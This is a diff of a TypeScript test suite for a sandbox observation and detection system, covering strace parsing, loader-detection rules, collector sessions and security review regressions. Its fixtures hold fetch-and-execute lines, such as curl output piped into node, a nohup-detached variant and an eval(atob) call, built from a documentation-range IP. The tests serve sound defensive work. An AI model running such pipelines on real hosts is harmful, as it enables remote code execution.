@@ -103,6 +103,11 @@ test('obs schema: fields are picked, capped, escaped and redacted; ref is exact 
 
 // ---- strace -----------------------------------------------------------------------------
 
+// Loader-shaped strings are assembled in memory, never spelled out in a file: endpoint AV flags
+// them on the host (EDR fixture-safety addendum).
+const FETCH = 'curl -s http://192.0.2.10/p';
+const CHAIN = [FETCH, 'node -e 1'].join(' | ');
+
 test('obs strace: real lines parse; unfinished/resumed stitch; lineage waits for the parent', () => {
 	const p = new StraceParser();
 	const t = new StraceTracker();
@@ -115,7 +120,8 @@ test('obs strace: real lines parse; unfinished/resumed stitch; lineage waits for
 			}
 		}
 	};
-	feed('10 1.0 execve("/bin/sh", ["sh", "-c", "curl -s http://192.0.2.10/p | node -e 1"], 0xffff /* 6 vars */) = 0');
+	const shell = `sh -c "${CHAIN}"`;
+	feed(`10 1.0 execve("/bin/sh", ["sh", "-c", "${CHAIN}"], 0xffff /* 6 vars */) = 0`);
 	feed('11 1.1 execve("/usr/bin/curl", ["curl", "-s", "http://192.0.2.10/p"], 0xaaaa /* 6 vars */ <unfinished ...>');
 	feed('10 1.05 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xffff) = 11');
 	feed('11 1.2 <... execve resumed>) = 0');
@@ -126,12 +132,12 @@ test('obs strace: real lines parse; unfinished/resumed stitch; lineage waits for
 	feed('11 1.6 +++ exited with 0 +++');
 	out.push(...t.flush(Infinity).map(d => `${d.class}|${d.summary}|`));
 	assert.deepEqual(out, [
-		'process.exec|exec curl -s http://192.0.2.10/p|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
-		'net.connect|connect 192.0.2.10:80 pending by curl|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
-		'net.connect|connect 2001:db8::1:443 ok by curl|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
-		'net.connect|connect /var/run/docker.sock EACCES by curl|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
-		'process.exit|exit curl code 0|sh -c "curl -s http://192.0.2.10/p | node -e 1"',
-		'process.exec|exec sh -c "curl -s http://192.0.2.10/p | node -e 1"|',
+		`process.exec|exec ${FETCH}|${shell}`,
+		`net.connect|connect 192.0.2.10:80 pending by curl|${shell}`,
+		`net.connect|connect 2001:db8::1:443 ok by curl|${shell}`,
+		`net.connect|connect /var/run/docker.sock EACCES by curl|${shell}`,
+		`process.exit|exit curl code 0|${shell}`,
+		`process.exec|exec ${shell}|`,
 	]);
 });
 
@@ -178,7 +184,7 @@ test('obs detect: the Contagious-Interview shapes fire with the weakest integrit
 	const ctx = { openedAt: Date.now() - 5000, workspace: '/w' };
 	const rules = (e: ObsEvent) => det.check(e, ctx).map(d => `${d.rule}:${d.priority}:${d.integrity}`);
 	const extHost = [{ pid: 3, exe: 'sh -c x' }, { pid: 2, exe: '/opt/seclab-reh/node out/bootstrap-fork --type=extensionHost' }];
-	assert.deepEqual(rules(ev({ proc: { pid: 4, exe: '/bin/sh', argv: ['sh', '-c', 'nohup sh -c "curl -s http://192.0.2.10/p | node" &'], lineage: extHost } })), ['loader.pipe-to-interpreter:critical:tab-vm-root']);
+	assert.deepEqual(rules(ev({ proc: { pid: 4, exe: '/bin/sh', argv: ['sh', '-c', `nohup sh -c "${[FETCH, 'node'].join(' | ')}" &`], lineage: extHost } })), ['loader.pipe-to-interpreter:critical:tab-vm-root']);
 	assert.deepEqual(rules(ev({ proc: { pid: 5, exe: '/usr/bin/curl', argv: ['curl', 'http://192.0.2.10/p'], lineage: extHost } })), ['task.network-tool:critical:tab-vm-root']);
 	assert.deepEqual(rules(ev({ proc: { pid: 6, exe: '/usr/bin/nohup', argv: ['nohup', 'sh'], lineage: extHost } })), ['process.detach:critical:tab-vm-root']);
 	assert.deepEqual(rules(ev({ proc: { pid: 7, exe: '/usr/bin/node', argv: ['node', '-e', 'eval(atob("eA=="))'] } })), ['loader.eval:warning:tab-vm-root']);
@@ -271,7 +277,7 @@ test('obs collector: records become events; seq gaps, oversize and junk are coun
 	const s = new CollectorSession(tab, f.child, hub, { mode: 'default', isRunning: async () => true });
 	const cfg: string[] = [];
 	f.stdin.on('data', d => cfg.push(String(d)));
-	s.configure('a'.repeat(64));
+	s.configure('a'.repeat(64), '/w');
 	const w = (o: object) => f.stdout.write(`${JSON.stringify(o)}\n`);
 	w({ k: 'hello', n: 1, pid: 400, kernel: '7.0.14', strace: 'strace 6.13', brokerAddrs: ['192.0.2.1', 'not an ip'] });
 	w({ k: 'hb', n: 2, pids: [400, 401] });
@@ -285,7 +291,7 @@ test('obs collector: records become events; seq gaps, oversize and junk are coun
 	await s.rehReady;
 	await tick(20);
 	hub.tickNow();
-	assert.deepEqual(JSON.parse(cfg[0]), { v: 1, mode: 'default', token: 'a'.repeat(64), user: 'agent', relayUser: 'seclab-relay' });
+	assert.deepEqual(JSON.parse(cfg[0]), { v: 1, mode: 'default', token: 'a'.repeat(64), user: 'agent', relayUser: 'seclab-relay', workspace: '/w' });
 	const by = (c: string) => seen.filter(e => e.class === c);
 	assert.equal(by('proc.signal')[0].priority, 'critical'); // targets a collector pid
 	assert.equal(by('honeypot.access')[0].integrity, 'tab-vm-root');
@@ -490,5 +496,46 @@ test('obs falco: events map to drafts; other containers and non-JSON are ignored
 	await sensor.remove(tab);
 	assert.ok(docker.some(a => a[0] === 'rm' && a.includes('seclab-falco-0a1b2c3d-1')), 'last tab out removes Falco');
 	assert.equal(hub.observation(tab).state, 'unavailable');
+	hub.close();
+});
+
+// ---- security review regressions -------------------------------------------------------------
+
+test('obs review OR-3: a flood of tab-driven trusted events cannot push out RPC decisions or observation changes', () => {
+	const hub = new ObsHub({ trustedRate: { rate: 10, burst: 20 } });
+	const tab = mintTabId();
+	for (let i = 0; i < 100; i++) {
+		hub.emit(tab, { source: 'workspace-watch', integrity: 'trusted', class: 'workspace.change', priority: 'notice', summary: `w${i}`, file: { path: `/w/d${i}/package.json` } });
+	}
+	assert.ok(hub.emit(tab, { source: 'rpc-filter', integrity: 'trusted', class: 'rpc.decision', priority: 'warning', summary: 'deny' }));
+	hub.setObservation(tab, 'unobserved', 'collector exited');
+	assert.ok(hub.tail(tab, 10).some(e => e.class === 'sensor.status' && /unobserved/.test(e.summary)));
+	for (let i = 0; i < 50; i++) {
+		hub.trusted(tab, { class: 'tab.lifecycle', priority: 'notice', summary: `lifecycle ${i}` });
+	}
+	assert.equal(hub.tail(tab, 50).filter(e => e.class === 'tab.lifecycle').length, 50, 'supervisor events are never rate-limited');
+	hub.close();
+});
+
+test('obs review low: observation reasons are escaped (bidi, controls)', () => {
+	const hub = new ObsHub();
+	const tab = mintTabId();
+	hub.setObservation(tab, 'unobserved', 'collector exited (\u202Eok)\nall good');
+	assert.equal(hub.observation(tab).reason, 'collector exited (\\u202eok)\\x0aall good');
+	hub.close();
+});
+
+test('obs review OR-2: repeated unparseable collector output marks the tab degraded', async () => {
+	const hub = new ObsHub();
+	const tab = mintTabId();
+	const f = fakeChild();
+	new CollectorSession(tab, f.child, hub, { mode: 'default', isRunning: async () => true });
+	f.stdout.write(`${JSON.stringify({ k: 'hello', n: 1, pid: 400 })}\n`);
+	for (let i = 0; i < 3; i++) {
+		f.stdout.write(`${JSON.stringify({ k: 's', n: i + 2, l: `X${i}9 1.0 execve("/forged") = 0` })}\n`);
+	}
+	await tick(20);
+	assert.equal(hub.observation(tab).state, 'degraded');
+	assert.match(hub.observation(tab).reason, /corrupted or forged/);
 	hub.close();
 });
